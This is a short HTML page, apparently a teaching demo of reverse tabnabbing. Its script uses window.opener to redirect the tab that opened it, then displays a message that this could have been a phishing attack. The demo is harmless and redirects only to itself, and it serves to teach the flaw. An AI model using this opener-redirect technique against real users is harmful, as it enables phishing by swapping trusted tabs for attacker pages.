<!doctype html>
<html>
<head>
    <title>Security Vulnerabilities - Reverse Tabnabbing</title>

    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700,800" rel="stylesheet">

    <style>
        html, body
        {
            height: 100%;
        }
        body
        {
            align-items: center;
            background-color: #cc0000;
            display: flex;
            font-family: 'Open Sans';
            justify-content: center;
            margin: 0;
            text-align: center;
        }
        #message
        {
            font-size: 7rem;
        }
    </style>
</head>
<body>
    <h1 id="message">;)</h1>

    <script>
        if ('#attack' === window.location.hash)
        {
            document.getElementById('message').innerHTML = 'This could have been a phishing attack...';
        }
        else
        {
            window.opener.location.assign(window.location.href + '#attack');
        }
    </script>
</body>
</html>
